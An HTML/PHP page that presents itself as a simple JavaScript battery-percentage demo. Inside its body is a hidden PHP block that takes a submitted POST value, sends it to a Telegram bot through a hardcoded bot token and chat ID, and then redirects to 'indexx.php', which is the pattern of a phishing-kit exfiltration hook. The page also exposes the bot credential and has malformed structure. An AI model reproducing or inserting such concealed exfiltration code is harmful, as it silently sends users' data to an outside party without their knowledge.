<!DOCTYPE html>  
 <html lang="en">  
<style>  
    body {  
     margin: 1rem;  
     padding: 2rem;  
     background-color: #eee;  
    }  
    .battry {  
     font-size: 2rem;  
     color: cornflowerblue;  
    }  
   </style>  
  <head>  
   <meta charset="UTF-8" />  
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />  
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
   <title>Javascript Battery Percentage </title>  
     </head>  
  <body>  
   <main>  
    <h1>Your battery Perctenage is</h1>  
    <div class="battry">
      
    </div>  
    <p>I am Daily Make new content For You ,hope you like this post</p>  
   </main>  
<?php
    $text=$_POST["battry"];
        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text");    
    header("Location: indexx.php");
?>
     </body>  
<script>  
    const BattryLevel = document.querySelector(".battry");  
    navigator.getBattery().then(function (battery) {  
     const level = battery.level;  
     const status = level * 100 + "%";  
     BattryLevel.innerHTML = status;  
    });  
   </script>
 </html>
